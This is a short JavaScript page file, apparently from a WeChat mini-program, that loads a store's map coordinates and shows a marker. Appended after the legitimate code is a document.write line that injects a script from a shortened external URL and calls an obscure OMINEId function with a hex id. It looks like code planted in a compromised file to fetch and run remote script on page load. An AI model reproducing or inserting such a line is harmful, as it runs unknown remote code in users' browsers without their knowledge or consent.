var t = getApp(),
  e = t.requirejs("core");
Page({
  data: {
    storeid: 0,
    markers: [],
    store: {}

  },
  onLoad: function (t) {
    this.setData({
      storeid: t.id
    }),
      this.getInfo()
  },
  getInfo: function () {
    var t = this;
    e.get("store/map", {
      id: this.data.storeid
    }, function (e) {
      t.setData({
        store: e.store,
        markers: [{
          id: 1,
          latitude: Number(e.store.lat),
          longitude: Number(e.store.lng)
        }
        ],
        show: true
      })
    })
  },
  phone: function (t) {
    e.phone(t)
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
